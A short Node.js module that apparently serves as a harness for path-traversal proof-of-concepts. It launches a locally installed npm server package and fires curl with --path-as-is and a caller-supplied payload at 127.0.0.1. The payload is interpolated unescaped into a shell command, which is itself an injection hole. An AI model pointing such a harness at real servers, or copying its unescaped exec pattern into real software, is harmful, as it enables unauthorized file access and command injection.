function exploitFunction(payload) {
  const path = require("path");
  const { sleep } = require("sleep");
  const { exec } = require("child_process");

  const serverCommand = "node ./node_modules/serverzyqzyq/index.js";
  const attackString = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;

  // Start the server
  exec(serverCommand, (error, stdout) => {
    if (error) {
      console.error(`Error starting server: ${error}`);
      return;
    }

    // Wait for a few seconds
    sleep.sleep(2);

    // Perform the attack
    exec(attackString, (error, stdout) => {
      if (error) {
        console.error(`Attack failed: ${error}`);
        return;
      }
      return stdout;
    });
  });
}

module.exports = { exploitFunction };